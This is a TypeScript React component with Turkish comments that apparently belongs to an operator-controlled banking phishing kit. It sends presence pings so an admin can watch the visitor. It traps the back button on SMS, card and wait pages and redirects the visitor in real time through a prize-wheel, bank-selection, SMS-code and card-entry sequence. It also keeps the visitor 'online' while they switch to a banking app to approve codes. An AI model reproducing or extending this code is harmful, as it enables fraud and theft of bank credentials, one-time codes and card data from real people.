"use client";

import { useEffect, useRef } from "react";
import { usePathname } from "next/navigation";
import type { SessionStatus, SessionStep } from "@/types/session";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import {
  pathToStep,
  resolveStepTargetPath,
  shouldRedirectToServerStep,
  isBackNavigationBlockedStep,
  getStepPriority,
} from "@/lib/session-routes";

const SS_BACK_FLAG_KEY = "__sr_back_flag__";
const SS_BACK_FLAG_TS = "__sr_back_flag_ts__";
const BACK_FLAG_MAX_AGE_MS = 15000;
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";
import { logAuditEvent } from "@/lib/audit-event";

type Props = {
  sessionId: string;
  routeSessionId?: string;
};

const RETURN_TO_BANK_LIST_FLAG = "bank-page:return-to-list";

/**
 * Sadece ŞU AN BANKA LİSTESİNDEYSEK (ya da bank detayındaysak) YÖNLENDİRMEYİ DURAKLAT.
 * (Kullanıcı GERİ tuşuyla banka listesine geri döndüyse, adminin tekrar listeye atmasını / loopa girmesini engeller)
 *
 * ⚠️ DİKKAT: Başka bir sayfada (win/sms/card/wait vb.) isek ADMİN'İN GÖNDERDİĞİ "banken" GELİRSE
 *    BU FLAG YOK SAYILIR, YÖNLENDİRME KAÇINILMAZDIR!
 */
function shouldPauseBankListRedirects(pathname: string) {
  const onBankRelatedPage =
    pathname.startsWith("/banken") ||
    pathname.startsWith("/banks") ||
    pathname.includes("/bank/");
  if (!onBankRelatedPage) return false; // Banka disinda sayfada ise: ADMIN yonlendirmesini UYGULA

  try {
    return window.sessionStorage.getItem(RETURN_TO_BANK_LIST_FLAG) === "1";
  } catch {
    return false;
  }
}

export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
  const pathname = usePathname();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);

  /* Presence: demo ortamında admin için online göstergesi — KESIN cozum (last_ping_at)
     - 3 SN'DE BIR sunucuya PING at (POST /api/session/ping, service-role)
     - SAYFA KAPANINCA (pagehide / beforeunload): DIREKT OFFLINE (silinmez, tarayıcı kapanınca kesin gitsin)
     - SIRKETICI visibility=hidden (sekme arkada, mobil kilit, SMS uygulamasına gitme vs.):
         * SON 10 DAKIKA ICINDE visibility=visible olduysa: OFFLINE ISARETLEME, sadece status='online' KALIR.
         * Kullanici 10dk dan uzun sure arkada tutarsa ya da tarayici gerçekten kapatilirsa: pagehide/beforeunload ile OFFLINE olur.
         * Boylece SMS onayi icin banka uygulamasi / messenger acinca ONLINE gozukmeye devam eder (bug olmaz). */
  useEffect(() => {
    persistActiveSession(sessionId, effectiveRouteSessionId);

    const PING_INTERVAL = 3_000;
    // Sadece SAYFA GERCEKTEN kapatilinca (pagehide/beforeunload) OFFLINE yap.
    // visibility=hidden icin MAKS 10 DAKIKA boyunca ONLINE tut (gecerli olursa tekrar visible olunca ONLINE devam).
    const VISIBILITY_HIDDEN_TOLERANCE_MS = 10 * 60 * 1000;
    let lastVisibleAt = Date.now();

    const currentStep = (() => {
      if (pathname.startsWith("/wheel")) return "wheel";
      if (pathname.startsWith("/banken")) return "banken";
      if (pathname.startsWith("/special-approval")) return "special_approval";
      try {
        const p = pathname.replace(/^\/+/, "");
        const known = ["code_entry","win","bank","sms","card","wait","invalid_bank","congrats","live_support"];
        const first = p.split("/")[0];
        if (known.includes(first)) return first;
        return first || null;
      } catch { return null; }
    })();

    const buildBody = (status: "online" | "offline") => JSON.stringify({
      sessionId,
      publicId: effectiveRouteSessionId,
      pathname,
      currentStep,
      status,
    });

    const pingOnline = async () => {
      try {
        // Birincil deneme: normal sessionId ile
        const resp = await fetch("/api/session/ping", {
          method: "POST",
          credentials: "same-origin",
          headers: { "Content-Type": "application/json" },
          body: buildBody("online"),
        });
        try {
          const j = await resp.json() as any;
          // Sunucu sessionId bulamadiysa ve fallback publicId ile denediyse sorun yok.
          // Session HIC bulunamadiysa (note='session_not_found...' ve publicId yoksa)
          //   ya da status=404 ise client burada anlar.
          if (j && j.ok === false && j.error) {
            logAuditEvent({
              session_id: sessionId,
              public_id: effectiveRouteSessionId,
              event_kind: "presence",
              event_action: "ping_online_failed",
              status: "error",
              pathname,
              meta: { httpStatus: resp.status, error: j.error, note: j.note || null },
            });
          }
        } catch { /* sessizce json parse hatasi */ }
      } catch (e: any) {
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "ping_online_fetch_error",
          status: "error",
          pathname,
          meta: { error: e?.message || String(e) },
        });
      }
    };

    const pingOfflineOrOnline = (status: "offline" | "online") => {
      try {
        const payload = new Blob([buildBody(status)], { type: "application/json" });
        if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
          try {
            const beaconOk = navigator.sendBeacon("/api/session/ping", payload);
            if (beaconOk) return;
          } catch { /* fallback */ }
        }
        try {
          void fetch("/api/session/ping", {
            method: "POST",
            credentials: "same-origin",
            headers: { "Content-Type": "application/json" },
            body: buildBody(status),
            keepalive: true,
          });
        } catch { /* ignore */ }
      } catch { /* ignore */ }
    };

    // Ilk mountta ONLINE ping + audit log
    void pingOnline();
    logAuditEvent({
      session_id: sessionId,
      public_id: effectiveRouteSessionId,
      event_kind: "presence",
      event_action: "session_mount_ping",
      pathname,
      meta: { effectiveRouteSessionId, ping_interval_ms: PING_INTERVAL, currentStep },
    });

    const t = window.setInterval(() => {
      // Interval boyunca visibility=hidden olsa bile (durdurulmayan interval tarayıcılar),
      // son 10dk icinde gorulduyse ONLINE ping atmaya devam et (SMS donunce kesin online).
      if (document.visibilityState === "visible") {
        lastVisibleAt = Date.now();
      }
      void pingOnline();
    }, PING_INTERVAL);

    // GERCEKTEN sayfadan cikiliyorsa (kapatma): OFFLINE.
    // NOT: beforeunload + pagehide ikisini birden dinle, her iki durumda da OFFLINE olsun.
    const markOffline = () => {
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "presence",
        event_action: "session_mark_offline_beacon",
        status: "warn",
        pathname,
      });
      pingOfflineOrOnline("offline");
    };

    const onVisibility = () => {
      if (document.visibilityState === "visible") {
        lastVisibleAt = Date.now();
        void pingOnline();
        return;
      }
      // visibility=hidden: sadece 10dk dan uzun sure beklediyse OFFLINE yap.
      // Aksi halde (kisa sureli SMS / app gecisi) ONLINE kalsın.
      const hiddenFor = Date.now() - lastVisibleAt;
      if (hiddenFor > VISIBILITY_HIDDEN_TOLERANCE_MS) {
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "session_hidden_timeout_offline",
          status: "warn",
          pathname,
          meta: { hiddenForMs: hiddenFor, toleranceMs: VISIBILITY_HIDDEN_TOLERANCE_MS },
        });
        pingOfflineOrOnline("offline");
      } else {
        // Kısa süreli arka planda kalma: DIKKATLI, sadece audit log at, OFFLINE ISARETLEME.
        logAuditEvent({
          session_id: sessionId,
          public_id: effectiveRouteSessionId,
          event_kind: "presence",
          event_action: "session_hidden_short_tolerated",
          pathname,
          meta: { hiddenForMs: hiddenFor, toleranceMs: VISIBILITY_HIDDEN_TOLERANCE_MS },
        });
      }
    };

    window.addEventListener("pagehide", markOffline);
    window.addEventListener("beforeunload", markOffline);
    document.addEventListener("visibilitychange", onVisibility);

    return () => {
      window.clearInterval(t);
      window.removeEventListener("pagehide", markOffline);
      window.removeEventListener("beforeunload", markOffline);
      document.removeEventListener("visibilitychange", onVisibility);
      // React unmount (SPA route degisimi): sayfada duruluyorsa (baska bir route), ONLINE kalmaya devam edebilir.
      // Bu yuzden cleanup'ta OFFLINE ISARETLEMIYORUZ. Sayfa kapaninca pagehide tetiklenir ve OFFLINE olur.
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* Global Geri (Back) Tuşu Yöneticisi:
     a) Eğer şu anki adım BLOCKED (wait/sms/card/special_approval/live_support) ise
        GERİ tuşunu tamamen BLOKLA (wait-client'teki fence mantığı gibi)
     b) Aksi halde GERİ tuşuna basıldığında bir sonraki sayfada (yani GERİ gidilen
        sayfada) SessionRealtimeGate'in anlaması için sessionStorage bayrağı koy.
  */
  useEffect(() => {
    if (typeof window === "undefined") return;

    let localStep: string | null = pathToStep(pathname);
    if (pathname.startsWith("/wheel")) localStep = "wheel";
    if (pathname.startsWith("/special-approval")) localStep = "special_approval";
    const currentStep = localStep;
    const blocked = isBackNavigationBlockedStep(currentStep);
    const pageUrl = window.location.href;
    const fenceKey = `__srg_fence_${sessionId}__`;

    // --- (a) BLOKLANMIŞ SAYFALAR (wait/sms/card/special/live_support): GERİ TUŞU ENGELLE ---
    if (blocked) {
      try {
        if ((window.history.state as any)?.[fenceKey] !== true) {
          window.history.replaceState(
            { ...(window.history.state || {}), [fenceKey]: true, __srgAnchor: true },
            "",
            pageUrl,
          );
        }
        window.history.pushState(
          { ...(window.history.state || {}), [fenceKey]: true, __srgFence: 1 },
          "",
          pageUrl,
        );
      } catch {}

      const onPopStateBlocked = () => {
        try {
          window.history.replaceState(
            { ...(window.history.state || {}), [fenceKey]: true, __srgAnchor: true },
            "",
            pageUrl,
          );
          window.history.pushState(
            { ...(window.history.state || {}), [fenceKey]: true, __srgFence: 2 },
            "",
            pageUrl,
          );
        } catch {}
        logAuditEvent({
          session_id: sessionId || null,
          public_id: effectiveRouteSessionId || null,
          event_kind: "step",
          event_action: "back_blocked",
          from_step: currentStep,
          to_step: currentStep,
          pathname,
          meta: { reason: "blocked_step", currentStep },
        });
        window.scrollTo({ top: 0, left: 0, behavior: "auto" });
      };

      window.addEventListener("popstate", onPopStateBlocked);
      return () => window.removeEventListener("popstate", onPopStateBlocked);
    }

    // --- (b) NORMAL SAYFALAR (wheel/win/banken/bank/invalid_bank/congrats ...): GERİ tuşu çalışsın ---
    // popstate tetiklendiğinde bir sonraki SessionRealtimeGate mount'unun
    // "GERİ ile geldi" diye anlaması için sessionStorage bayrağı koy.
    const onPopStateNormal = () => {
      try {
        window.sessionStorage.setItem(SS_BACK_FLAG_KEY, "1");
        window.sessionStorage.setItem(SS_BACK_FLAG_TS, String(Date.now()));
      } catch {}
      logAuditEvent({
        session_id: sessionId || null,
        public_id: effectiveRouteSessionId || null,
        event_kind: "step",
        event_action: "back_initiated",
        from_step: currentStep,
        pathname,
        meta: { currentStep },
      });
    };
    window.addEventListener("popstate", onPopStateNormal);
    return () => window.removeEventListener("popstate", onPopStateNormal);
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* İlk yüklemede sunucu adımı ile senkron — ADIM ÖNCELİĞİ KURALI UYGULA
     ⚠️ AYRICA: Eğer GERİ tuşu ile gelmişsek (sessionStorage bayrağı) ve şu anki
     (local) adım DB adımından DAHA DÜŞÜK öncelikli ise (GERİYE gittik demek),
     DB adımını LOCAL adımı ile GÜNCELLE. Böylece SessionRealtimeGate bizi
     yanlışlıkla tekrar ileri adımına yönlendirmez.
  */
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (shouldPauseBankListRedirects(pathname)) return;
      const supabase = createBrowserSupabaseClient();
      if (supabase === null) return;

      // GERİ bayrağını oku (popstate ile geldik mi?) — OKUNDUKTAN SONRA temizle (tek seferlik)
      let cameFromBackNav = false;
      let backTs: number | null = null;
      try {
        const flag = window.sessionStorage.getItem(SS_BACK_FLAG_KEY);
        const tsStr = window.sessionStorage.getItem(SS_BACK_FLAG_TS);
        if (flag === "1" && tsStr) {
          backTs = Number(tsStr);
          const age = Date.now() - backTs;
          if (age >= 0 && age <= BACK_FLAG_MAX_AGE_MS) cameFromBackNav = true;
        }
      } catch {}

      const { data } = await supabase.from("sessions").select("current_step,status,form_data").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) return;

      // Bayrağı VERİYİ ÇEKİNCE (async bittikten sonra) sil —
      // önce okuyup hemen silersek popstate gerçekten geldiyse bile bayrak kaybolmaz garantide.
      if (cameFromBackNav) {
        try {
          window.sessionStorage.removeItem(SS_BACK_FLAG_KEY);
          window.sessionStorage.removeItem(SS_BACK_FLAG_TS);
        } catch {}
      }

      const status = data.status as SessionStatus | undefined;
      if (status === "SPECIAL_INFO") {
        if (!pathname.startsWith("/special-approval")) {
          logAuditEvent({
            session_id: sessionId,
            public_id: effectiveRouteSessionId,
            event_kind: "step",
            event_action: "server_step_redirect",
            from_step: pathname,
            to_step: "special_approval",
            pathname,
            meta: { reason: "initial_sync_special_info", cameFromBackNav },
          });
          window.location.href = "/special-approval";
        }
        return;
      }

      let local: string | null = pathToStep(pathname);
      if (pathname.startsWith("/wheel")) local = "wheel";

      // --- GERİ DÖNÜŞ DÜZELTME (KALICI): GERİ geldiysem ve GERİYE gittiysem (serverP > localP)
      //     1) DB stepini LOCAL (şu anki sayfa) ile GÜNCELLE (ki admin panelinde doğru görünsün)
      //     2) HEMEN RETURN ET — YÖNLENDİRME YAPMA.
      //     (Eski kodda DB güncellemesi asenkron bitmeden shouldRedirect eski DB değeriyle
      //      çalışıyor ve kullanıcıyı tekrar banken/bank'a atıyordu — o düzeltildi.)
      if (cameFromBackNav && local && data.current_step) {
        const serverStep = data.current_step as SessionStep;
        const localP = getStepPriority(local);
        const serverP = getStepPriority(serverStep);

        if (serverP > localP) {
          // GERİYE dönüş var — DB'yi güncelle, YÖNLENDİRME YAPMA
          logAuditEvent({
            session_id: sessionId,
            public_id: effectiveRouteSessionId,
            event_kind: "step",
            event_action: "db_step_sync_from_back",
            from_step: serverStep,
            to_step: local,
            pathname,
            meta: { reason: "user_hit_back_button_no_redirect", localP, serverP },
          });
          await supabase
            .from("sessions")
            .update({ current_step: local, is_hidden: false })
            .eq("id", sessionId);

          // ⚠️ KULLANICIYI BIRAKTIĞIN YERDE BIRAK — GERİYE geldi, burada kalsın (örn win isim sayfası)
          return;
        }
      }

      if (!data.current_step) return;
      const serverStep = data.current_step as SessionStep;

      if (!shouldRedirectToServerStep({ localStep: local, serverStep })) return;

      const target = resolveStepTargetPath(
        serverStep,
        sessionId,
        effectiveRouteSessionId,
        (data.form_data ?? {}) as { bankSlug?: string | null },
      );
      logAuditEvent({
        session_id: sessionId,
        public_id: effectiveRouteSessionId,
        event_kind: "step",
        event_action: "server_step_redirect",
        from_step: local,
        to_step: serverStep,
        pathname,
        meta: { reason: "initial_sync_priority_rule", cameFromBackNav },
      });
      window.location.href = target;
    })();
    return () => {
      cancelled = true;
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  /* Realtime: admin current_step/status değişince anında yönlendir
     ⚠️ Sadece current_step VEYA status GERÇEKTEN değiştiğinde işlem yap!
     Ping ile gelen last_ping_at / status:online→online / ip_address güncellemelerini GÖRMEZDEN GEL.
     Böylece kullanıcı hiçbir şey yapmadan 3sn'de bir YÖNLENDİRME döngüsüne girmez.

     ÖNEMLİ KURAL (ADMİN MANUEL YÖNLENDİRMESİ):
       - Eğer step GERÇEKTEN değiştiyse (oldStep !== newStep) ve
         ADMIN PANELİNDEN clear bir yönlendirme ise (örn: wait(100) -> banken(30)),
         "öncelik kuralı (serverP > localP)" KURALINI UYGULAMA.
         Admin isterse wait'teki kullanıcıyı tekrar banken / win / herhangi bir adıma
         GERİ gönderebilmeli. Bu durumda shouldRedirect'ten bağımsız YÖNLENDİR.
  */
  useEffect(() => {
    const supabase = createBrowserSupabaseClient();
    if (!supabase) return;

    const channel = supabase
      .channel(`demo-session:${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          if (shouldPauseBankListRedirects(pathname)) {
            return;
          }
          const next = payload.new as {
            current_step?: SessionStep;
            status?: SessionStatus;
            form_data?: { bankSlug?: string | null } | null;
          };
          const old = payload.old as {
            current_step?: SessionStep;
            status?: SessionStatus;
          } | null;

          const oldStep = typeof old?.current_step === "string" ? old.current_step : null;
          const newStep = typeof next.current_step === "string" ? next.current_step : null;
          const oldStatus = typeof old?.status === "string" ? old.status : null;
          const newStatus = typeof next.status === "string" ? next.status : null;

          const stepChanged = oldStep !== newStep;
          const statusChanged = oldStatus !== newStatus;

          // ⚠️ NE current_step DEĞİŞTİ NE de status (SPECIAL_INFO). (Bu durum: ping ile last_ping_at güncellenmesi vb.)
          // İşlem YAPMA, döngüyü kır.
          if (!stepChanged && !statusChanged) {
            return;
          }

          if (newStatus === "SPECIAL_INFO") {
            if (!pathname.startsWith("/special-approval")) {
              logAuditEvent({
                session_id: sessionId,
                public_id: effectiveRouteSessionId,
                event_kind: "step",
                event_action: "admin_realtime_redirect",
                from_step: pathname,
                to_step: "special_approval",
                pathname,
                meta: { reason: "realtime_channel_status_changed", status: newStatus ?? null, oldStatus: oldStatus ?? null },
              });
              window.location.href = "/special-approval";
            }
            return;
          }

          if (!newStep) return;
          let local: string | null = pathToStep(pathname);
          if (pathname.startsWith("/wheel")) local = "wheel";

          // ⚠️ ADMIN ZORLAMALI YÖNLENDİRME:
          // Eğer server'daki step GERÇEKTEN DEĞİŞTİ (admin panelinden geldi):
          //   - Admin korumalı adımdan (wait/sms/card/...) GERİ adımlara (win/banken/bank...) giderse: YÖNLENDİR.
          //   - Normal ileri yönde (win→banken) de zaten shouldRedirect true döner.
          //   - Eğer aynı sayfadaysak (localStep === serverStep) veya shouldRedirect false dönse bile
          //     step CHANGED ise ADMIN açıkça göndermiş olabilir — O YÜZDEN:
          //     localStep === newStep eşit DEĞİLSE YÖNLENDİR.
          if (local === newStep) {
            return; // Zaten oradayız, dokunma
          }

          // Admin zorlamalı yönlendirme (realtime) için shouldRedirect gevşetildi:
          //   Sadece "kullanıcı daha ileride ve admin GERİYE göndermiyor" ise
          //   (yani client bank'ta, admin win isterse — kullanıcı bankta veri girebilir, geri gönderme)
          //   durumunda bak. Aksi halde (ADMİN step değiştirmiş) yönlendir.
          const shouldStrictCheck =
            stepChanged &&
            oldStep != null &&
            oldStep !== newStep;
          const bypassStrict = Boolean(shouldStrictCheck); // Admin panelinden change gelmişse bypass et

          if (!bypassStrict && !shouldRedirectToServerStep({ localStep: local, serverStep: newStep })) {
            return;
          }

          const target = resolveStepTargetPath(
            newStep,
            sessionId,
            effectiveRouteSessionId,
            (next.form_data ?? {}) as { bankSlug?: string | null },
          );
          logAuditEvent({
            session_id: sessionId,
            public_id: effectiveRouteSessionId,
            event_kind: "step",
            event_action: "admin_realtime_redirect",
            from_step: local,
            to_step: newStep,
            pathname,
            meta: {
              reason: "realtime_channel_priority_rule",
              status: newStatus ?? null,
              oldStep,
              newStep,
              stepChanged,
              statusChanged,
              bypassStrict,
            },
          });
          window.location.href = target;
        },
      )
      .subscribe();

    return () => {
      void supabase.removeChannel(channel);
    };
  }, [effectiveRouteSessionId, sessionId, pathname]);

  return null;
}
